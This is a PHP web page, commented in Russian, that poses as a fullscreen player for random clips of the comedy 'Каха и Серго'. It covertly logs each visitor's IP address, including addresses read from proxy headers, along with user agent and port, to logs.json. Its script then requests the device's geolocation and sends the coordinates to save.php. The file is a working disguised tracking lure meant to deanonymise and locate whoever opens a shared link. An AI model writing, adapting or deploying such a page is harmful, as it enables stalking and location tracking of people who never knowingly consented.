<?php
// index.php
session_start();

// Установка временной зоны Узбекистана (Ташкент) для точной фиксации кликов
date_default_timezone_set('Asia/Tashkent');

// Функция продвинутого определения реального IP пользователя в обход прокси-серверов
function getRealIP() {
    $ip_keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($ip_keys as $key) {
        if (!empty($_SERVER[$key])) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                // Валидация публичного IP-адреса
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
            // Если публичный IP не найден, но передан валидный локальный IP
            if (filter_var($_SERVER[$key], FILTER_VALIDATE_IP) !== false) {
                return $_SERVER[$key];
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Не определен';
}

$ip = getRealIP();
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Не определен';
$request_time = date('Y-m-d H:i:s'); // Время фиксируется по Ташкенту
$protocol = $_SERVER['SERVER_PROTOCOL'] ?? '';
$port = $_SERVER['REMOTE_PORT'] ?? '';

// Массив с разными сериями и нарезками "Кахи и Серго"
$videos = [
    'T28_EOn60Wk', // Непосредственно Каха - 1 сезон, 1 серия
    'xRkC0lPkW9g', // Лучшие приколы и нарезки с Кахой и Серго
    'Nn6k73_W7S0', // Сборник сочных моментов из сериала
    'p93_v_xW64w', // Каха и Серго — смешные диалоги и разборки
    'jG0qL8v4_EE', // Популярный эпизод на авторынке
    '7A6Xw7vP_l8'  // Серго и Каха — подборка топовых шуток
];

// Случайный выбор видео из массива для каждого нового посетителя
$random_video = $videos[array_rand($videos)];

// Структура записи для хранения в базе данных логов
$log_entry = [
    'id' => uniqid(),
    'time' => $request_time,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'protocol' => $protocol,
    'port' => $port,
    'lat' => 'Доступ отклонен или ожидается',
    'lon' => 'Доступ отклонен или ожидается'
];

// Сохраняем ID текущей сессии для связки с AJAX-обработчиком координат
$_SESSION['current_log_id'] = $log_entry['id'];

// Запись первичных данных в файл logs.json
$file = 'logs.json';
$current_data = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
if (!is_array($current_data)) $current_data = [];
$current_data[$log_entry['id']] = $log_entry;
file_put_contents($file, json_encode($current_data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Воспроизведение...</title>
    <style>
        /* Стили для создания абсолютно полноэкранного плеера без рамок */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            overflow: hidden;
        }
        .fullscreen-video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: none;
            background: #000;
        }
    </style>
</head>
<body>

<!-- Настроенный iframe плеер со случайным видео Кахи -->
<iframe 
    class="fullscreen-video"
    src="https://www.youtube.com/embed/<?php echo $random_video; ?>?autoplay=1&mute=1&loop=1&playlist=<?php echo $random_video; ?>&controls=1&rel=0" 
    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
    allowfullscreen>
</iframe>

<script>
// Запрос координат устройства средствами браузера
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
        const data = new FormData();
        data.append('lat', position.coords.latitude);
        data.append('lon', position.coords.longitude);

        // Отправка полученных координат в save.php
        fetch('save.php', {
            method: 'POST',
            body: data
        });
    }, function(error) {
        console.log("Доступ к геопозиции не предоставлен устройством.");
    });
}
</script>
</body>
</html>